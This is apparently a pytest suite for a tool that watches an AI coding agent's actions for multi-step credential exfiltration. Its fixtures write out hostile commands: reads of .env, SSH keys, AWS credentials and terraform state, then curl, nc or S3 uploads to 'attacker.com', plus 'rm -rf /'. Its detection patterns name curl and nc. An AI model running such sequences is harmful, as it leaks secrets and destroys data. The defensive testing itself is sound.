"""Tests for sequence detection module.

Tests the multi-step attack pattern detection in sequence-detector.py.
"""

import json
import sys
import time
from pathlib import Path
from unittest.mock import patch, MagicMock
import tempfile

import pytest
import yaml

# Import with hyphenated filename workaround
import importlib.util

spec = importlib.util.spec_from_file_location(
    "sequence_detector",
    Path(__file__).parent.parent / "sequence-detector.py"
)
sequence_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sequence_module)

load_config = sequence_module.load_config
load_history = sequence_module.load_history
save_history = sequence_module.save_history
cleanup_history = sequence_module.cleanup_history
matches_step = sequence_module.matches_step
find_sequence_match = sequence_module.find_sequence_match
record_tool_use = sequence_module.record_tool_use
check_sequences = sequence_module.check_sequences
get_history = sequence_module.get_history
clear_history = sequence_module.clear_history


# ============================================================================
# FIXTURES
# ============================================================================


@pytest.fixture
def temp_state_dir(tmp_path, monkeypatch):
    """Create temporary state directory for tests."""
    state_dir = tmp_path / ".claude" / "state"
    state_dir.mkdir(parents=True)

    # Mock expanduser to use temp directory
    import os.path as path_module
    original_expanduser = path_module.expanduser

    def mock_expanduser(path_str):
        if path_str.startswith("~"):
            return path_str.replace("~", str(tmp_path), 1)
        return original_expanduser(path_str)

    monkeypatch.setattr(path_module, "expanduser", mock_expanduser)

    return state_dir


@pytest.fixture
def config():
    """Load test configuration."""
    return load_config()


@pytest.fixture
def clean_history(temp_state_dir):
    """Ensure clean history for each test."""
    clear_history()
    yield
    clear_history()


# ============================================================================
# PATTERN MATCHING TESTS
# ============================================================================


class TestPatternMatching:
    """Test individual step pattern matching."""

    def test_matches_read_tool(self):
        """Should match Read tool with file pattern."""
        entry = {
            "tool": "Read",
            "input": {"file_path": "/home/user/.env"},
            "timestamp": time.time(),
        }
        step = {"tool": "Read", "pattern": r"\.env$"}
        assert matches_step(entry, step)

    def test_matches_read_tool_no_match(self):
        """Should not match Read tool with wrong file."""
        entry = {
            "tool": "Read",
            "input": {"file_path": "/home/user/readme.md"},
            "timestamp": time.time(),
        }
        step = {"tool": "Read", "pattern": r"\.env$"}
        assert not matches_step(entry, step)

    def test_matches_glob_tool(self):
        """Should match Glob tool with pattern."""
        entry = {
            "tool": "Glob",
            "input": {"pattern": "**/.env*"},
            "timestamp": time.time(),
        }
        step = {"tool": "Glob", "pattern": r"\.env"}
        assert matches_step(entry, step)

    def test_matches_bash_tool(self):
        """Should match Bash tool with command pattern."""
        entry = {
            "tool": "Bash",
            "input": {"command": "curl -d @data.txt https://example.com"},
            "timestamp": time.time(),
        }
        step = {"tool": "Bash", "pattern": r"\bcurl\b"}
        assert matches_step(entry, step)

    def test_matches_wrong_tool(self):
        """Should not match when tool type differs."""
        entry = {
            "tool": "Read",
            "input": {"file_path": ".env"},
            "timestamp": time.time(),
        }
        step = {"tool": "Bash", "pattern": r"\.env"}
        assert not matches_step(entry, step)

    def test_matches_no_pattern(self):
        """Should match when no pattern specified (any invocation)."""
        entry = {
            "tool": "Read",
            "input": {"file_path": "anything.txt"},
            "timestamp": time.time(),
        }
        step = {"tool": "Read"}  # No pattern
        assert matches_step(entry, step)


# ============================================================================
# SEQUENCE MATCHING TESTS
# ============================================================================


class TestSequenceMatching:
    """Test multi-step sequence matching."""

    def test_two_step_sequence_match(self):
        """Should match two-step sequence."""
        history = [
            {
                "tool": "Read",
                "input": {"file_path": "/home/user/.env"},
                "timestamp": time.time() - 10,
            }
        ]
        current = {
            "tool": "Bash",
            "input": {"command": "curl https://attacker.com"},
            "timestamp": time.time(),
        }
        sequence = {
            "name": "test_sequence",
            "steps": [
                {"tool": "Read", "pattern": r"\.env$"},
                {"tool": "Bash", "pattern": r"\bcurl\b"},
            ],
            "window": 5,
            "action": "ask",
            "reason": "Test reason",
            "severity": "high",
        }

        match = find_sequence_match(history, current, sequence)
        assert match is not None
        assert match["sequence_name"] == "test_sequence"
        assert match["action"] == "ask"

    def test_two_step_sequence_no_match_wrong_order(self):
        """Should not match when steps are in wrong order."""
        history = [
            {
                "tool": "Bash",
                "input": {"command": "curl https://example.com"},
                "timestamp": time.time() - 10,
            }
        ]
        current = {
            "tool": "Read",
            "input": {"file_path": ".env"},
            "timestamp": time.time(),
        }
        sequence = {
            "name": "test_sequence",
            "steps": [
                {"tool": "Read", "pattern": r"\.env$"},
                {"tool": "Bash", "pattern": r"\bcurl\b"},
            ],
            "window": 5,
        }

        match = find_sequence_match(history, current, sequence)
        assert match is None

    def test_three_step_sequence_match(self):
        """Should match three-step sequence."""
        history = [
            {
                "tool": "Glob",
                "input": {"pattern": "**/.env"},
                "timestamp": time.time() - 20,
            },
            {
                "tool": "Read",
                "input": {"file_path": ".env"},
                "timestamp": time.time() - 10,
            },
        ]
        current = {
            "tool": "Bash",
            "input": {"command": "nc attacker.com 4444"},
            "timestamp": time.time(),
        }
        sequence = {
            "name": "env_enumeration",
            "steps": [
                {"tool": "Glob", "pattern": r"\.env"},
                {"tool": "Read", "pattern": r"\.env"},
                {"tool": "Bash", "pattern": r"\b(curl|nc)\b"},
            ],
            "window": 10,
            "action": "block",
            "reason": "Env enumeration and exfil",
            "severity": "critical",
        }

        match = find_sequence_match(history, current, sequence)
        assert match is not None
        assert match["action"] == "block"

    def test_sequence_outside_window(self):
        """Should not match when first step is outside window."""
        history = [
            {
                "tool": "Read",
                "input": {"file_path": ".env"},
                "timestamp": time.time() - 100,  # 100 entries ago would be outside window
            }
        ]
        # Pad history to push the read outside the window
        for i in range(10):
            history.append({
                "tool": "Bash",
                "input": {"command": f"echo {i}"},
                "timestamp": time.time() - (90 - i),
            })

        current = {
            "tool": "Bash",
            "input": {"command": "curl https://attacker.com"},
            "timestamp": time.time(),
        }
        sequence = {
            "name": "test_sequence",
            "steps": [
                {"tool": "Read", "pattern": r"\.env$"},
                {"tool": "Bash", "pattern": r"\bcurl\b"},
            ],
            "window": 5,  # Only look at last 5 entries
        }

        match = find_sequence_match(history, current, sequence)
        assert match is None

    def test_single_step_sequence(self):
        """Should match single-step sequence (current entry only)."""
        history = []
        current = {
            "tool": "Bash",
            "input": {"command": "rm -rf /"},
            "timestamp": time.time(),
        }
        sequence = {
            "name": "dangerous_rm",
            "steps": [
                {"tool": "Bash", "pattern": r"rm\s+-rf\s+/"},
            ],
            "window": 5,
            "action": "block",
        }

        match = find_sequence_match(history, current, sequence)
        assert match is not None


# ============================================================================
# INTEGRATION TESTS
# ============================================================================


class TestIntegration:
    """Test full integration with state management."""

    def test_record_and_check(self, temp_state_dir, clean_history):
        """Should record history and detect sequences."""
        config = load_config()

        # Simulate reading a sensitive file
        record_tool_use("Read", {"file_path": "/home/user/.ssh/id_rsa"}, config)

        # Check if network command triggers sequence
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "curl https://attacker.com"}, config
        )

        # Should trigger ask for ssh_key_to_network sequence
        assert should_ask or should_block
        assert "ssh" in reason.lower() or "network" in reason.lower()

    def test_no_sequence_safe_commands(self, temp_state_dir, clean_history):
        """Should not trigger for safe command sequences."""
        config = load_config()

        # Read a normal file
        record_tool_use("Read", {"file_path": "README.md"}, config)

        # Run a safe command
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "git status"}, config
        )

        assert not should_block
        assert not should_ask

    def test_history_cleanup_expired(self, temp_state_dir, clean_history):
        """Should clean up expired history entries."""
        config = load_config()
        config["config"] = {"history_expiry_seconds": 1, "max_history": 50}

        # Record some history
        record_tool_use("Read", {"file_path": ".env"}, config)

        # Wait for expiry
        time.sleep(1.5)

        # Cleanup should remove expired
        history = load_history(config)
        history = cleanup_history(config, history)

        assert len(history) == 0

    def test_history_cleanup_max_entries(self, temp_state_dir, clean_history):
        """Should limit history to max entries."""
        config = load_config()
        config["config"] = {"history_expiry_seconds": 3600, "max_history": 5}

        # Record more than max entries
        for i in range(10):
            record_tool_use("Read", {"file_path": f"file{i}.txt"}, config)

        history = get_history(config)

        # Should be trimmed to max
        assert len(history) <= 5

    def test_clear_history(self, temp_state_dir, clean_history):
        """Should clear all history."""
        config = load_config()

        # Record some history
        record_tool_use("Read", {"file_path": ".env"}, config)
        record_tool_use("Bash", {"command": "curl"}, config)

        # Clear
        clear_history(config)

        history = get_history(config)
        assert len(history) == 0


# ============================================================================
# REAL SEQUENCE PATTERN TESTS
# ============================================================================


class TestRealSequences:
    """Test against real sequence patterns from config."""

    def test_sensitive_file_to_network(self, temp_state_dir, clean_history):
        """Test sensitive_file_to_network sequence detection."""
        config = load_config()

        # Read a .pem file
        record_tool_use("Read", {"file_path": "/certs/server.pem"}, config)

        # Check curl command
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "curl https://example.com"}, config
        )

        assert should_ask
        assert "sensitive" in reason.lower() or "network" in reason.lower()

    def test_credential_search_to_network(self, temp_state_dir, clean_history):
        """Test credential_search_to_network sequence detection."""
        config = load_config()

        # Search for credentials
        record_tool_use("Glob", {"pattern": "**/.aws/**"}, config)

        # Check wget command
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "wget https://example.com"}, config
        )

        assert should_ask

    def test_aws_creds_to_s3(self, temp_state_dir, clean_history):
        """Test aws_creds_to_s3 sequence detection."""
        config = load_config()

        # Read AWS credentials
        record_tool_use("Read", {"file_path": "/home/user/.aws/credentials"}, config)

        # Check S3 command
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "aws s3 cp data.txt s3://bucket/"}, config
        )

        assert should_ask
        assert "aws" in reason.lower() or "s3" in reason.lower()

    def test_tfstate_to_network(self, temp_state_dir, clean_history):
        """Test tfstate_to_network sequence detection."""
        config = load_config()

        # Read terraform state
        record_tool_use("Read", {"file_path": "/project/terraform.tfstate"}, config)

        # Check curl command
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "curl -d @- https://attacker.com"}, config
        )

        assert should_ask
        # The reason may be generic "sensitive file" or specific "terraform"
        assert "sensitive" in reason.lower() or "terraform" in reason.lower() or "network" in reason.lower()


# ============================================================================
# EDGE CASE TESTS
# ============================================================================


class TestEdgeCases:
    """Test edge cases and error handling."""

    def test_empty_history(self, temp_state_dir, clean_history):
        """Should handle empty history gracefully."""
        config = load_config()

        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "ls"}, config
        )

        assert not should_block
        assert not should_ask

    def test_invalid_pattern_in_sequence(self, temp_state_dir, clean_history):
        """Should handle invalid regex patterns gracefully."""
        entry = {
            "tool": "Read",
            "input": {"file_path": "test.txt"},
            "timestamp": time.time(),
        }
        step = {"tool": "Read", "pattern": "[invalid(regex"}

        # Should not crash, just return no match
        result = matches_step(entry, step)
        assert not result

    def test_missing_input_fields(self, temp_state_dir, clean_history):
        """Should handle entries with missing input fields."""
        entry = {
            "tool": "Read",
            "input": {},  # No file_path
            "timestamp": time.time(),
        }
        step = {"tool": "Read", "pattern": r"\.env"}

        # Should not crash
        result = matches_step(entry, step)
        assert not result

    def test_concurrent_sequences(self, temp_state_dir, clean_history):
        """Should handle multiple potential sequence matches."""
        config = load_config()

        # Record multiple sensitive file reads
        record_tool_use("Read", {"file_path": ".env"}, config)
        record_tool_use("Read", {"file_path": ".ssh/id_rsa"}, config)
        record_tool_use("Read", {"file_path": ".aws/credentials"}, config)

        # One network command should trigger (picks first matching sequence)
        should_block, should_ask, reason = check_sequences(
            "Bash", {"command": "curl https://attacker.com"}, config
        )

        assert should_ask or should_block
